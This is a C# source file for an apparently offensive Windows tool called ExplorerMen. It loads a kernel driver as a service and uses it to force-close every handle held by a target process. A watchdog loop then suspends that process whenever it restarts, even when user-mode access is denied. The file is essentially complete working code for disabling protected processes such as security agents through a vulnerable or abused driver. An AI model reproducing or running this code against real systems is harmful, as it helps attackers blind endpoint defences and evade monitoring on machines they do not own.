using Args;
using System;
using System.Diagnostics;
using static Windows.API;
using static Windows.Enums;
using static ExplorerMen.Utils;
using static ExplorerMen.Utils.ColorStatus;

namespace ExplorerMen
{
    public class Program
    {

        public static void Main(string[] args)
        {

            var ParsedArgs = ArgParse.Parse(args);
            if (!ParsedArgs.ParsedOk || args.Length == 0)
            {
                PrettyPrint("[-] Failed to parse args", Error);
                PrettyPrint("[!] Try to use /usage, /help, /examples", Info);
                return;
            }

            if (ParsedArgs.Arguments.ContainsKey("/help"))
            {
                PrettyPrint(Help, Info);
                return;
            }
            if (ParsedArgs.Arguments.ContainsKey("/usage"))
            {
                PrettyPrint(Usage, Info);
                return;
            }
            if (ParsedArgs.Arguments.ContainsKey("/examples"))
            {
                PrettyPrint(Examples, Info);
                return;
            }

            bool bService = ParsedArgs.Arguments.TryGetValue("/service", out string serviceName);
            bool bInstall = ParsedArgs.Arguments.TryGetValue("/install", out string driverPath);
            bool bPid = ParsedArgs.Arguments.TryGetValue("/pid", out string _PID);
            bool bName = ParsedArgs.Arguments.TryGetValue("/name", out string procName);
            bool watchdog = ParsedArgs.Arguments.ContainsKey("/watchdog");

            if (!bService && !bInstall)
            {
                PrettyPrint("[-] Must supply either /install or /service", Error);
                return;
            }

            if (!bPid && !bName)
            {
                PrettyPrint(("[-] Must supply Process Id (/pid) or Process Name (/name)"), Error);
                return;
            }

            int PID = 0;

            if (bName)
            {
                Process[] processes = Process.GetProcessesByName(procName);
                if (processes.Length == 0)
                {
                    PrettyPrint("[-] Failed to find Process Name", Error);
                    return;
                }
                procName = processes[0].ProcessName;
                PID = processes[0].Id;
            }
            else if (bPid)
            {
                if (!(int.TryParse(_PID, out PID)))
                {
                    PrettyPrint("[-] Invalid number supplied as PID", Error);
                    return;
                }

                try
                {
                    procName = Process.GetProcessById(PID).ProcessName;
                }
                catch (ArgumentException e)
                {
                    PrettyPrint(string.Format("[-] {0}", e.Message), Error);
                    return;
                }
            }
            PrettyPrint(string.Format("[!] Targeting Process: {0} (PID: {1})", procName, PID), Info);

            Service service = new(serviceName);

            if (bInstall)
            {
                // Create the service
                if (!System.IO.File.Exists(driverPath))
                {
                    PrettyPrint(string.Format("[-] File \"{0}\" not exists or no permissions", driverPath), Error);
                    return;
                }
                service.DriverPath = driverPath;
                if (!service.CreateService())
                    return;
            }
            else
            {
                if (!service.StartService())
                    return;
            }


            IntPtr hDriver = Driver.GetDriverHandle();
            if (hDriver == IntPtr.Zero)
            {
                PrettyPrint(string.Format("[-] Failed to get handle to driver. (Error Code: {0})", GetLastError), Error);
                return;
            }
            PrettyPrint("[+] Got handle to driver", Success);



            var lstHandles = GetHandles(PID);
            if (lstHandles.Count == 0)
            {
                PrettyPrint("[!] No handles found", Info);
                CloseHandle(hDriver);
                return;
            }

#if DEBUG
            Console.WriteLine("=== Listing all handles ===");
            foreach (var handle in lstHandles)
            {
                var output = string.Format("UniqueProcessId: {0} , ObjectType: {1}, Handle Flags: {2}, Handle Value: 0x{3:x},  ObjectPointer: 0x{4:x}, Access Mask: 0x{5:x}",
                    handle.UniqueProcessId, handle.ObjectType, handle.HandleFlags, handle.HandleValue, handle.ObjectPointer, handle.AccessMask);
            }
            Console.WriteLine("[!] Total number of lstHandles: {0}", lstHandles.Count);
#endif



            foreach (var handle in lstHandles)
            {
                if (GetHandleType((IntPtr)(handle.HandleValue)) != null)
                {
                    Driver.CloseHandle(hDriver, (IntPtr)(handle.HandleValue), PID, (ulong)handle.ObjectPointer);
                }
            }

            if (!watchdog)
            {
                PrettyPrint("[+] Finished", Success);
                CloseHandle(hDriver);
                return;
            }

            PrettyPrint("[!] Starting Watchdog...\n", Info);

            // Check if we need kernel mode handle or we can use user mode handle
            bool userMode = false;
            IntPtr _hPid = OpenProcess(PROCESS_SUSPEND_RESUME, false, (ulong)PID);
            if (_hPid != IntPtr.Zero || GetLastError != 5) // 5 = ERROR_ACCESS_DENIED
            {
                userMode = true;
                CloseHandle(_hPid);
            }


            while (true)
            {

                Process[] watchDogProcName = Process.GetProcessesByName(procName);

                if (watchDogProcName.Length == 0)
                {
                    continue;
                }
                else if (watchDogProcName[0].Id != PID)
                {
                    PID = watchDogProcName[0].Id;

                    IntPtr hProc = userMode ? OpenProcess(PROCESS_SUSPEND_RESUME, false, (ulong)PID) : Driver.GetProcessHandle(hDriver, PID);
                    NtSuspendProcess(hProc);
                    CloseHandle(hProc);
                    PrettyPrint(string.Format("[+] Caught {0} (PID: {1})", procName, PID), Success);
                }

            }

        }
    }
}
